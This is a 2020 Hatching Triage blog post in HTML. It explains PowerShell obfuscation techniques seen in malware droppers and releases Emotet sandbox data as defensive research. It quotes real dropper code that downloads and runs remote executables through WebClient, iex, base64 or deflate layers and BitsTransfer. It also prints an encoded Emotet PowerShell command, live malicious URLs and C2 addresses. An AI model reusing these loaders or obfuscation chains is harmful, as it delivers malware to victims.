@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-15.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-15.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>Powershell Static Analysis &amp; Emotet results</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom theme-light">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+        <h2>Powershell Static Analysis &amp; Emotet results</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-15.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2020-01-07T00:00:00Z">2020-01-07</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=triage">triage</a></p><li><p><a href="/blog/#category=malware">malware</a></p><li><p><a href="/blog/#category=powershell">powershell</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/pete.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Team</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <p><code>Warning: this blogpost contains malicious URLs, don't open 'em.</code></p>
+<p><code>Note: Scroll down if you're only interested in the Emotet results.</code></p>
+<h2 id="powershell-twirks">Powershell twirks</h2>
+<p>Due to a high number of Powershell droppers in our <a href="https://tria.ge/">public cloud</a>
+we&rsquo;ve implemented an engine for Powershell that translates Powershell into an
+<a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">AST</a>, deobfuscates it,
+and runs various high-level static analysis algorithms on the deobfuscated AST.
+For specific use-cases a limited Powershell emulator has also been implemented.</p>
+<p>With that out of the way we wanted to share some <code>&quot;&quot;&quot;InTErEstInG&quot;&quot;&quot;</code> features of
+the Powershell language (naturally accompanied with various obfuscation
+techniques) and provide results and statistics from Powershell-related samples
+submitted to <a href="https://tria.ge/">tria.ge</a>.</p>
+<p>We&rsquo;re going to start out with the simplest version to download a file in
+Powershell. Almost all Powershell droppers use this technique (or the
+<code>DownloadString</code> version that fetches the URL in-memory) to obtain the real
+payload from a URL that&rsquo;s often only online for a very limited period of time.</p>
+<pre><code>(new-object net.webclient).downloadfile('hxxp://www.kuaishounew.com/wget.exe','wget.exe');
+</code></pre>
+<p>Keeping that in mind, most simple Powershell droppers are structured as
+follows; determine some payload filename, set up one or more URLs, iterate
+through each URL and try to download it, and if successful (the file size is
+more than a couple of kilobytes), then execute it as a new process.</p>
+<pre><code>$path = &quot;...&quot;;
+$web = New-Object net.webclient;
+$urls = &quot;url1,url2,url3,url4,url5&quot;.split(&quot;,&quot;);
+foreach ($url in $urls) {
+    try {
+        $web.DownloadFile($url, $path);
+        if ((Get-Item $path).Length -ge 30000) {
+            [Diagnostics.Process]::Start($path);
+            break;
+        }
+    }
+    catch{}
+}
+</code></pre>
+<p>Powershell being a dynamic scripting language and all that, it&rsquo;s possible
+to do things in multiple ways. For example, calling the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-6">New-Object cmdlet</a>
+can also be expressed with its string obfuscated through the
+<code>dot expression</code>.</p>
+<pre><code>.('new-'+'o'+'bjec'+'t') NET.weBCLIENt
+</code></pre>
+<p>Or through the similar <code>amp expression</code>. Naturally, Powershell allowing
+escape sequences, there can be backticks in the identifier.</p>
+<pre><code>&amp;('ne'+'w-'+'o'+'bject') nET.wE`BCLieNT
+</code></pre>
+<p>Or at the beginning of an identifier.</p>
+<pre><code>New-Object nET.`wE`BCLieNT
+</code></pre>
+<p>Or at the end of an identifier.</p>
+<pre><code>.('new-obje'+'c'+'t') net`.WebClIe`Nt
+</code></pre>
+<p>In order to make Powershell a truly dynamic language, it shall be possible to
+use a string as method/field identifier (this calls <code>DownloadFile</code> on
+the <code>net.webclient</code> object). This string identifier may also contain
+backticks.</p>
+<pre><code>$Glmodecoxsyda.&quot;dO`WnlO`ADfILE&quot;($Muyiwcipde, $Waazouqp);
+</code></pre>
+<p>There are many ways to obfuscate a string or an array. Most of the time the
+<code>split</code> method is called on a string to obtain an array of URLs.</p>
+<pre><code>$VlR='hxxp://kulikovonn.ru/l5vT7q19U@hxxp://optics-line.com/vUUp9ygDE@hxxp://lonestarcustompainting.com/BLC3RY4O@hxxp://montegrappa.com.pa/OkyoMANm@hxxp://kristianmarlow.com/mhFm2oA4Q'.Split('@');
+
+PS C:\Users\Administrator&gt; $VlR
+hxxp://kulikovonn[.]ru/l5vT7q19U
+hxxp://optics-line[.]com/vUUp9ygDE
+hxxp://lonestarcustompainting[.]com/BLC3RY4O
+hxxp://montegrappa[.]com[.]pa/OkyoMANm
+hxxp://kristianmarlow[.]com/mhFm2oA4Q
+</code></pre>
+<p>There&rsquo;s also a string formatting operator for &ldquo;smart&rdquo; concatenation operations,
+in this case resulting in the string <code>&quot;hello&quot;</code>.</p>
+<pre><code>PS C:\Users\Administrator&gt; &quot;{1}{0}&quot;-f(&quot;{1}{0}&quot;-f'o','ll'),'he'
+hello
+</code></pre>
+<p>In practice this may look as follows.</p>
+<pre><code>$QxB__QxB=(&quot;{43}{19}{27}{11}{38}{23}{26}{34}{33}{25}{21}{3}{6}{32}{10}{14}{17}{45}{40}{9}{31}{13}{24}{2}{44}{41}{28}{12}{8}{29}{47}{22}{39}{48}{7}{36}{49}{37}{18}{35}{20}{4}{42}{0}{1}{5}{30}{16}{46}{15}&quot;-f (&quot;{0}{4}{1}{2}{3}&quot; -f (&quot;{1}{2}{0}{3}&quot;-f'drago',':','//','n'), 'a','n','g.','f'), (&quot;{1}{0}{2}&quot; -f'a',(&quot;{1}{0}&quot; -f'm/n','co'),'v'),'c','u', (&quot;{2}{0}{1}&quot;-f 'n4/','@ht','j'),'/d','zx.', (&quot;{1}{2}{5}{3}{0}{4}&quot;-f(&quot;{1}{0}&quot;-f':/','http'),'h/S','k',(&quot;{0}{1}&quot; -f 'E','A/@'),'/di','hH'),'/w','htt','/',(&quot;{0}{1}&quot; -f'con','t'), 'm','pro','wp','/','fe','-i',(&quot;{0}{1}&quot;-f (&quot;{1}{0}&quot; -f 'com','lat.'),'/'),(&quot;{1}{0}&quot; -f(&quot;{0}{1}&quot;-f'tp',':/'),'t'),'O',(&quot;{0}{1}&quot; -f 'c',(&quot;{0}{1}&quot; -f'hun','b')),'em',(&quot;{0}{1}&quot;-f (&quot;{1}{0}&quot; -f'S8','2t'),'A'), (&quot;{1}{0}&quot;-f'ha','fit'),(&quot;{1}{0}&quot; -f'ww.','/w'),'/@',(&quot;{1}{4}{3}{0}{2}&quot; -f (&quot;{1}{0}&quot;-f't.','sa'),'/ww',(&quot;{0}{1}{2}&quot;-f 'co','m/','wp-'), 'att','w.l'),'co','p-c','w',(&quot;{1}{0}&quot; -f'//','ps:'),'com','/', (&quot;{1}{0}&quot;-f'ps:','htt'),(&quot;{0}{1}&quot;-f 'fl','v/'),'ego','b',(&quot;{1}{0}&quot; -f 't/','en'),(&quot;{0}{1}&quot;-f (&quot;{1}{0}&quot; -f 'k','es/s'),'et'), (&quot;{0}{1}{2}&quot; -f (&quot;{1}{0}&quot; -f'/','des'),'I2','/@'),'.','tp','h','k',(&quot;{1}{0}&quot; -f 'clu','n'),'O',(&quot;{2}{0}{1}&quot;-f(&quot;{0}{1}&quot; -f'ten','t'),'/th', 'on'),'c',(&quot;{0}{1}&quot; -f 'gr','im')).&quot;spl`It&quot;('@')
+
+
+PS C:\Users\Administrator&gt; $QxB__QxB
+hxxp://www[.]lattsat[.]com/wp-content/2tS8A/
+hxxps://www[.]chunbuzx[.]com/wp-includes/I2/
+hxxps://profithack[.]com/wp-content/themes/sketch/SkhHEA/
+hxxp://diegogrimblat[.]com/flv/Ojn4/
+hxxp://dragonfang[.]com/nav/dwfeO/
+</code></pre>
+<p>Clearly building upon earlier constructs, the <code>&quot;split&quot;</code> method
+identifier may also be obfuscated with string concatenation. To make matters
+more interesting, object methods have methods of their own, in this case
+<code>Invoke</code> to execute the method with the arguments provided to the
+<code>Invoke</code> method.</p>
+<pre><code>(&quot;&lt;urlshere&gt;&quot;).(&quot;{0}{1}&quot;-f'Spl','it').Invoke('@')
+</code></pre>
+<p>Also note that it&rsquo;s possible to do Powershell programming without the space
+bar as most operators can be put right behind each other without whitespaces
+in-between.</p>
+<pre><code>PS C:\Users\Administrator&gt; 5 -band 3
+1
+PS C:\Users\Administrator&gt; 5-band3
+1
+PS C:\Users\Administrator&gt; &quot;1&quot;,&quot;3&quot;-join&quot;2&quot;
+123
+</code></pre>
+<p>The <code>-split</code> operator is interesting, because the assumption is that it
+would return a list of strings, which it probably does. But then if you have
+multiple <code>-split</code> operators following one another, you appear to get a
+flat list too, so probably <code>-split</code> can work on both strings and arrays.
+Note that the string separator may also be an integer, internally probably
+casted to be a string.</p>
+<pre><code>PS C:\Users\Administrator&gt; &quot;he4llo0w1rld&quot; -split &quot;4&quot; -split 0 -split &quot;1&quot;
+he
+llo
+w
+rld
+</code></pre>
+<p>Like most scripting languages, it&rsquo;s possible to execute arbitrary Powershell
+code at runtime (like <code>eval()</code> in Javascript). This is the
+<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6">Invoke-Expression cmdlet</a> or <code>iex</code> short and looks as follows.</p>
+<pre><code>PS C:\Users\Administrator&gt; iex 'write-host 1'
+1
+</code></pre>
+<p>Since Powershell can handle command-line invocations, it also has a built-in
+pipe operator.</p>
+<pre><code>PS C:\Users\Administrator&gt; 'write-host 1'|iex
+1
+</code></pre>
+<p>To avoid specifically mentioning the <code>iex</code> string, many droppers use
+global Powershell variables to construct the string at runtime paired with the
+<code>dot</code> and <code>amp</code> expressions. One may find the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6">$ENV</a> variable to
+be interesting too or at least how it&rsquo;s pretty much the only thing that&rsquo;s
+indexed with a colon identifier (<code>:comspec</code>, with <code>COMSPEC</code> being
+a Windows environment variable). Each of the following expressions are
+equivalent to just writing out <code>Invoke-Expression</code> directly.</p>
+<pre><code>&amp;( $VERBOSePREFerence.TOSTRinG()[1,3]+'x'-JOiN'')
+
+&amp; ( $SheLLId[1]+$shEllId[13]+'x')
+
+&amp;( $EnV:cOmSpEc[4,15,25]-JOIN'')
+</code></pre>
+<p>Additionally, yes, there&rsquo;s also a <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6">Set-Alias cmdlet</a> (or <code>sal</code> short)
+that&rsquo;s capable of essentially symlinking a method or cmdlet to another name in
+Powershell.</p>
+<pre><code>PS C:\Users\Administrator&gt; sal ping iex;ping(&quot;write-host 1&quot;)
+1
+</code></pre>
+<p>With the knowledge from all the above, we can now move into deobfuscating the
+first layer of the following Powershell dropper. It first removes garbage
+characters through the <code>-split</code> operator and then iterates over each
+character using the <code>foreach-object</code> cmdlet and <code>-bxor</code> operator,
+that performs a binary xor operation, to get the deobfuscated string.</p>
+<p>Interestingly, both operands to the <code>-bxor</code> operator are integer
+strings, one regular number (base10) and one hexadecimal number (base16).
+Snippet somewhat shortened for improved visibility.</p>
+<pre><code>iNVoKE-expREsSIOn( [sTRIng]::joIn('', ('16,102e94&amp;92D9&amp;90,81~67O25D91O86D94&amp;81,87e64{20-122O81{64e26{99~81s86s119D88~93~81e90&amp;64e15D16&amp;109O89s123e9R19~92O64O64{68,14~27~27O67{67{67~26&amp;94-76-68-70D93O90{64R26&amp;70e65&amp;27D64{85,80~5~97D7D126e85e89~6,27'-sPLiT 'd' -sPlIt '~' -SPlIt ','-sPlIt'S'-SpLIt '-'-sPlIT '&amp;' -Split 'e' -sPLIT '{' -SpLIt'O'-SpliT 'r' | fOREAcH-ObjEct{[cHaR] ($_ -BXOr &quot;0x34&quot;) })))
+</code></pre>
+<p>(This calls <code>Invoke-Expression</code> with the following string, shortened for
+visibility).</p>
+<pre><code>$Rjh=new-object Net.WebClient;$YmO='http://www[.]jxprint[.]ru/tad1U3Jam2/...
+</code></pre>
+<p>The next step in obfuscation includes adding a base64 blob that&rsquo;s executed
+(snippet shortened) using <code>[System.Convert]::FromBase64String(...)</code>.</p>
+<pre><code>invoke-expression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JHBhdGggPSAkZW52OlRFTVAgKyAnXEFueSBOYW1lLmV4ZSc7IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly9oYnNl')))
+</code></pre>
+<p>(This calls <code>Invoke-Expression</code> with the following string, shortened for
+visibility).</p>
+<pre><code>$path = $env:TEMP + '\Any Name.exe'; (New-Object System.Net.WebClient).DownloadFile('http://hbse...
+</code></pre>
+<p>And if that&rsquo;s not enough, one can always spice it up with a deflate/zlib
+stream (snippet shortened) using
+<code>New-Object System.IO.Compression.DeflateStream(...)</code>.</p>
+<pre><code>&amp;( $VERBOSePREFerence.TOSTRinG()[1,3]+'x'-JOiN'') (New-OBjeCt  Io.StrEaMrEADeR( ( New-OBjeCt  sYStEm.iO.compResSioN.DeFLaTeSTREAM([iO.mEmoRySTream] [sysTEM.ConVert]::frOMBASE64STrING( ('V'+'dHR'+'at'+'swFA'+'bgV9G'+'F'+'QQl'+'Z7H'+'Z4'+'g9YYK'+'lfUZGxrvRBqQi'+'H'+'I'+'6r'+'GtSpaMrdou'+'I'+'e8'+'...') ),[SYstEm.IO.ComPresSIOn.COmpRESSionModE]::DECOmPreSs)), [sySTeM.TExt.encOdiNG]::Ascii) ).ReadToeNd( )
+</code></pre>
+<p>But what if we obfuscate the <code>Set-Alias</code> parameter? This example casts
+an array of integers to an array of characters and then to a string (the
+string <code>&quot;ieX&quot;</code>). The Set-Alias command then aliases the <code>sy</code>
+identifier to the <code>&quot;ieX&quot;</code>, which is equivalent to <code>iex</code> and thus
+<code>Invoke-Expression</code>.</p>
+<pre><code>$qG=[string][char[]]@(0x69,0x65,0x58) -replace ' ','';sal sy $qG;$Wg=((New-Object Net.WebClient)).DownloadString('hxxp://windowsdressedup.com/admincontrol/out-75927603.ps1');sy $Wg
+</code></pre>
+<p>Next to the <code>foreach-object { ... }</code> construct, there&rsquo;s also the shorter
+<code>% { ... }</code> construct, both working with the pipe operator,
+accepting an item or an array of items. The following results in <code>hello</code>.</p>
+<pre><code>((104, 101, 108, 108, 111) | %{([char] [int] $_)})-jOIN''
+</code></pre>
+<p>Fun fact: if you replace <code>[char] [int]</code> in the snippet above with
+<code>[ChAR] [iNt]</code> (as was the case in the sample where this example
+originated from), then Powershell on Windows 10 may avoid running it and throw the
+<code>This script contains malicious content and has been blocked by your antivirus software.</code> error.
+This is what we call the Spongebob filter :-)</p>
+<p>Now that you&rsquo;ve seen almost everything, we&rsquo;re introducing the <code>foreach</code>
+language construct as obfuscated string. One might expect this to be a
+language keyword / statement, but well, here goes. This also results in
+<code>hello</code>.</p>
+<pre><code>((104, 101, 108, 108, 111) | .('for'+'E'+'ach') { ([char][int]$_)})-jOIN''
+</code></pre>
+<p>In case you&rsquo;re not convinced by the power of Powershell yet,
+Powershell has a concept of <code>generic</code> strings that
+essentially represent plaintext code that can&rsquo;t possibly be correct Powershell
+code. In other words, it&rsquo;s possible to write down URLs without quotes as one
+would normally define one or more strings. Not unsurprisingly the comma is
+actually interpreted correctly and the below <code>-Source</code> parameter of
+<code>Start-BitsTransfer</code> results in an array of 3 URLs.</p>
+<pre><code>Import-Module BitsTransfer; Start-BitsTransfer -Source hxxps://raw.githubusercontent.com/jocofid282/tewsa/master/blow.exe,hxxps://raw.githubusercontent.com/jocofid282/tewsa/master/dera,hxxps://raw.githubusercontent.com/jocofid282/tewsa/master/JvlpB.exe -Destination &quot;$env:TEMP\blow.exe&quot;,&quot;$env:TEMP\dera&quot;,&quot;$env:TEMP\JvlpB.exe&quot;
+</code></pre>
+<p>Fortunately for us, the .NET engine also knows the concept of Secure Strings.
+Since some of our samples in production decrypt &ldquo;secure strings&rdquo; and then
+execute the plaintext code resulting from it, we have implemented this
+behavior too.</p>
+<p>While we were initially startled by the fact that the SecureString took around
+a 10x increase in size when compared to the plaintext string, this fact is
+quickly explained by the decryption process. The SecureString is essentially a
+hex encoded AES CBC encrypted UTF16 encoded string. This string is then
+joined with the SecureString version number and the Initialization Vector
+(which itself is base64 encoded), UTF16 encoded, base64 encoded, and finally
+a magic header is slapped onto it. The following image regarding the
+decryption process better explains the logic:</p>
+<figure><img src="../../static/images/blog/ps1/encrypt-flow.svg">
+</figure>
+
+<p>In terms of Powershell fun &amp; quirks this is it for today, although there&rsquo;s
+plenty more to talk about.. wildcards, reflection, powershell executing
+x86 shellcode, etc.</p>
+<h2 id="emotet-results-in-production">Emotet results in production</h2>
+<p>We&rsquo;ve had quite some people submit Powershell-based payloads to our public
+cloud, partially due to our <a href="https://tria.ge/reports/191225-a3g39c5c7j/task1">Emotet</a> <a href="https://tria.ge/reports/191225-as7jwva61j/task1">configuration</a> <a href="https://tria.ge/reports/191224-t97e5medbs/task1">extractor</a>, but also
+due to numerous other malware samples that are being uploaded on a daily
+basis.</p>
+<p>Furthermore, we implemented a Powershell static analysis library capable of
+handling the above Powershell quirks and around 99% of the Powershell payloads
+that we&rsquo;ve seen in our production environment at <a href="https://tria.ge/">tria.ge</a>.
+Combining these two facts, we arrived at the following conclusion:</p>
+<p><strong>Giving back to the community, we&rsquo;re releasing polished sandbox results on more
+than 50,000 unique malware samples that we believe to be Emotet-related.</strong></p>
+<p>The data can be found <a href="https://hatching.io/static/files/emotet07012020.json.gz">here</a>.</p>
+<p>An example entry of polished analysis with all artifacts available (with
+sha256 and sha512 hashes removed for visibility):</p>
+<pre><code>{
+    &quot;family&quot;: &quot;emotet&quot;,
+    &quot;taskid&quot;: &quot;200101-1s48ckzwxj&quot;,
+    &quot;archive&quot;: {
+        &quot;md5&quot;: &quot;40cb422a49bfa7ae143156f73dba4149&quot;,
+        &quot;sha1&quot;: &quot;6d97ee9291d0b9ad64e2c8da30c945dfa706809d&quot;,
+    },
+    &quot;document&quot;: {
+        &quot;md5&quot;: &quot;c2f04f8e408daf34a47cce39d492902e&quot;,
+        &quot;sha1&quot;: &quot;70ed95f2bba918fc1833f4eafa0f780cdcfa4711&quot;,
+    },
+    &quot;dropper&quot;: {
+        &quot;cmdline&quot;: &quot;Powershell -w hidden -en JABGAG4AZwBpAGEAdQB1AGoAeABrAHQAPQAnAFcAagBvAHgAdQB3AHkAdwB2ACcAOwAkAFYAdQBpAHYAZgBkAHEAaAAgAD0AIAAnADgANAA0ACcAOwAkAEMAcABsAHIAbQBhAGkAbABuAD0AJwBIAHMAbgBuAHYAdwBrAGQAawBiAHEAbABtACcAOwAkAEkAYgB2AGsAbwBhAG8AaABwAGYAaQA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAVgB1AGkAdgBmAGQAcQBoACsAJwAuAGUAeABlACcAOwAkAFcAawB4AHMAawByAHgAYQB4AD0AJwBSAGsAagBrAGgAcQBoAGwAZwAnADsAJABOAHgAYgBhAHAAaQBiAHkAbQBrAHEAPQAuACgAJwBuAGUAdwAnACsAJwAtAG8AJwArACcAYgBqAGUAJwArACcAYwB0ACcAKQAgAG4AZQB0AC4AVwBlAGIAYwBMAEkARQBOAHQAOwAkAFQAbQB5AHMAYgBnAG4AYgBqAGIAZwByAHQAPQAnAGgAdAB0AHAAOgAvAC8AbQBhAGMAbwBtAHAALgBjAG8ALgBpAGwALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AZAA3ADgAaQAzAGoALQBwAGsAeAA2AGwAZQBnAGcANQAtADkAMgA5ADkANgAzADMAOAAvACoAaAB0AHQAcAA6AC8ALwBuAGEAeQBtAG8AdgAuAGMAbwBtAC8AdQBjAGgAZQBiAGEALwBrAHYAbAAwAHYAcwBzAC0AcQByAGUAeAA0AC0ANQAwADEANgAyADUAOQA2ADQALwAqAGgAdAB0AHAAOgAvAC8AbgBlAG8AdgBpAHQAYQAuAGMAbwBtAC8AaQB3AGEAMgAxAC8AWgB2AGYAQwBsAEUALwAqAGgAdAB0AHAAOgAvAC8AbgBmAHMAYwBvAG4AcwB1AGwAdABpAG4AZwAuAHAAdAAvAGMAZwBpAC0AYgBpAG4ALwBZAHkAbAB4AFAARgAvACoAaAB0AHQAcAA6AC8ALwBuAGkAdABlAGMAaAAuAG0AdQAvAG0AbwBkAHUAbABlAHMALwBUAFkASgB3AGIATwBrAG0ALwAnAC4AIgBzAFAAbABgAEkAdAAiACgAJwAqACcAKQA7ACQASgBkAGEAawBzAHkAZwBtAGQAPQAnAEgAZQB5AG8AdgBlAGYAawAnADsAZgBvAHIAZQBhAGMAaAAoACQASQBlAG8AYgBkAGoAbQBkAHgAeQBoAHgAcAAgAGkAbgAgACQAVABtAHkAcwBiAGcAbgBiAGoAYgBnAHIAdAApAHsAdAByAHkAewAkAE4AeABiAGEAcABpAGIAeQBtAGsAcQAuACIAZABPAFcAbgBsAG8AQQBgAEQAZgBpAGAATABlACIAKAAkAEkAZQBvAGIAZABqAG0AZAB4AHkAaAB4AHAALAAgACQASQBiAHYAawBvAGEAbwBoAHAAZgBpACkAOwAkAEgAbgBlAGEAdAB6AHQAegBlAGEAawA9ACcAQQB1AHIAegB5AHoAdABrAGMAagBxACcAOwBJAGYAIAAoACgALgAoACcARwAnACsAJwBlAHQAJwArACcALQBJAHQAZQBtACcAKQAgACQASQBiAHYAawBvAGEAbwBoAHAAZgBpACkALgAiAGwAZQBuAGAAZwB0AGgAIgAgAC0AZwBlACAAMgAyADYAMwAyACkAIAB7AFsARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgAiAFMAYABUAEEAcgBUACIAKAAkAEkAYgB2AGsAbwBhAG8AaABwAGYAaQApADsAJABUAHYAYwBnAHcAbgBxAGMAcAB2AD0AJwBZAG0AbgB5AHkAcABnAG8AeAB1AGQAZgBoACcAOwBiAHIAZQBhAGsAOwAkAEYAZgBlAG8AdwBvAG4AYQBlAGIAdQBvAG4APQAnAEUAdwBwAHoAYQBnAHgAZABrAGEAdwBxAG8AJwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAWAB6AGwAbwBsAHgAawBoAG4AawBsAGwAPQAnAEQAYgB0AG8AeQBwAGgAcABoAGsAcgBoAGIAJwA=&quot;,
+        &quot;urls&quot;: [
+            &quot;http://macomp.co.il/wp-content/d78i3j-pkx6legg5-92996338/&quot;,
+            &quot;http://naymov.com/ucheba/kvl0vss-qrex4-501625964/&quot;,
+            &quot;http://neovita.com/iwa21/ZvfClE/&quot;,
+            &quot;http://nfsconsulting.pt/cgi-bin/YylxPF/&quot;,
+            &quot;http://nitech.mu/modules/TYJwbOkm/&quot;
+        ]
+    },
+    &quot;payload&quot;: {
+        &quot;filepath&quot;: &quot;C:\\Users\\Admin\\844.exe&quot;,
+        &quot;md5&quot;: &quot;8565d2e08b151eac88953b4f244502fd&quot;,
+        &quot;sha1&quot;: &quot;a6102580563981dd6a3d399ea524248d716d2022&quot;,
+    },
+    &quot;emotet&quot;: {
+        &quot;pubkey&quot;: &quot;-----BEGIN PUBLIC KEY-----\nMHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAMqZMACZDzcRXuSnj2OI8LeIYKrbUIXL\nfaUgIJPwYd305HnaBS2AfA0R+oPxT32r+3BbayI3KguqAn3E+rbwtLhqhOXOlTnY\n7yvG4ufmwCCkRzc6Sq8baToxmd6y523AIQIDAQAB\n-----END PUBLIC KEY-----\n&quot;,
+        &quot;c2&quot;: [
+            &quot;85.100.122.211:80&quot;,
+            &quot;78.189.165.52:8080&quot;,
+            &quot;88.248.140.80:80&quot;,
+            &quot;45.79.75.232:8080&quot;,
+            &quot;124.150.175.133:80&quot;,
+            ... snip ...
+        ]
+    }
+}
+</code></pre>
+<p>Some more information on the data file:</p>
+<ul>
+<li>Each line contains one JSON blob detailing one Emotet analysis.</li>
+<li>The <code>taskid</code> field links to the task ID on
+<a href="https://tria.ge/">tria.ge</a>, our cloud sandbox. E.g., the first entry
+(<code>200101-1dghyjegsn</code>) equals the analysis at
+<a href="https://tria.ge/reports/200101-1dghyjegsn/task1">200101-1dghyjegsn</a>.</li>
+<li>The <code>archive</code> hashes, if present, contain the hashes of the archive
+that was submitted to Triage. E.g., if the sample was delivered as Office
+document in a Zip file.</li>
+<li>The <code>document</code> hashes contain the hashes of the Office dropper
+document or, if the Emotet payload was submitted directly, the Emotet
+payload.</li>
+<li>The <code>dropper</code> entry, if present, contains information on the executed
+Powershell payload and the Dropper URLs that we extracted from this
+Powershell payload. One may find that many different Office documents
+execute the exact same Powershell payload, but that doesn&rsquo;t make the sample
+hashes irrelevant.</li>
+<li>The <code>payload</code> hashes, if present, contain the hashes of the dropped
+Emotet payload.</li>
+<li>The <code>emotet</code> entry, if present, contains the RSA Public Key as well as
+C2 information embedded in the Emotet payload.</li>
+</ul>
+<h1 id="conclusion">Conclusion</h1>
+<p>We&rsquo;ve implemented a Powershell deobfuscator and emulator that&rsquo;s capable of
+handling the vast majority of Powershell payloads that we see in our public
+cloud. As always, we will continue to improve our sandboxing tooling to
+improve handling specific use-cases and we&rsquo;re going to keep an eye on all
+newly submitted (Powershell and other) samples!</p>
+<p>If any customers or (potential) users would like to use any of our static
+analysis capabilities standalone from the sandboxing side of things or if
+there are other requests related to our sandbox, please do reach out to us.</p>
+<p>Happy hunting &amp; analyzing and stay tuned for our upcoming blogposts!</p>
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>Triage Knowledge Base</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2021-03-18/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Ep. 132: Triage Thursday</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2024-05-16/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Network Simulation and Family Updates</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2021-08-19/">Read</a>
+        </li>
+      
+        <li>
+          <h3>General Techniques</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/ransomware-part1/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
